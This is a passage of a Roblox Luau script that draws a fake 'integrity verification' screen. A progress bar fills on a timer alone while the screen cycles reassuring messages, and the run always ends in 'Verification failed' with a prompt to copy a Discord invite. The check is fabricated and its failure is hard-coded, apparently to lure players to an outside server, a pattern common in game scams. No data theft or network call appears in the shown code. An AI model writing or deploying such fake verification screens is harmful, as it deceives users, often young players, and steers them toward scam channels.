    "Checking integrity, please wait...",
    "Finalizing verification..."
}
local startT = tick()
local msgIdx = 1
local lastSwap = tick()
local t = 0
local conn
conn = RunService.Heartbeat:Connect(function(dt)
    stepWater(dt)
    t = t + dt
    Pill.BackgroundTransparency = 0.08 + math.abs(math.sin(t * 1.6)) * 0.1
    local e = tick() - startT
    local p = math.min(e / LOAD_DUR, 1)
    BarFill.Size = UDim2.new(p, 0, 1, 0)
    if p < 1 and tick() - lastSwap >= 30 then
        lastSwap = tick()
        msgIdx = (msgIdx % #MSGS) + 1
        tw(StatusLbl, {TextTransparency = 1}, 0.25)
        task.delay(0.3, function()
            if StatusLbl.Parent then
                StatusLbl.Text = MSGS[msgIdx]
                VerificationTitle.Text = MSGS[msgIdx]
                tw(StatusLbl, {TextTransparency = 0}, 0.25)
            end
        end)
    end
    if p >= 1 then
        conn:Disconnect()
        gameOver = true
        VerificationTitle.Text = "Verification failed"
        VerificationTitle.TextColor3 = C.error
        StatusLbl.Text = "Please join our Discord server for further assistance."
        StatusLbl.TextColor3 = C.warning
        tw(BarFill, {BackgroundColor3 = C.error}, 0.5)
        DiscordBtn.Text = "Copy Discord invite"
        CopyStatus.Text = "Please join our Discord server for further assistance."
        CopyStatus.TextColor3 = C.warning
        tw(DiscordBtn, {BackgroundTransparency = 0.02}, 0.25)
    end
end)
SG.Destroying:Connect(function()
    if conn and conn.Connected then conn:Disconnect() end
    if dragConn and dragConn.Connected then dragConn:Disconnect() end
end)
